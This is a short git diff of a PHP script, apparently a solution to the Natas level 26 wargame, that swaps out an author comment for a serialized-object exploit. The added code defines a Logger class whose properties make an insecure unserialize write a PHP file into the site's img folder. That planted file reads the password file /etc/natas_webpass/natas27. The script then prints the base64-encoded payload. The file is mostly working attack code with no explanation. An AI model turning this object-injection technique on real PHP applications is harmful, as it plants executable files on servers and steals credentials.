@@ -1,8 +1,17 @@
 <?php
+class Logger {
+    private $logFile;
+    private $initMsg;
+    private $exitMsg;
+    
+    function __construct(){
+        $this->initMsg="heyyyyyy\n";
+        $this->exitMsg="<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>\n";
+        $this->logFile = "/var/www/natas/natas26/img/pass.php";
+    }
+}
 
-/**
- * @Author: ariesduanmu
- * @Date:   2019-04-28 23:16:46
- * @Last Modified by:   ariesduanmu
- * @Last Modified time: 2019-04-28 23:16:46
- */
+$o = new Logger();
+print base64_encode(serialize($o));
+?>
+
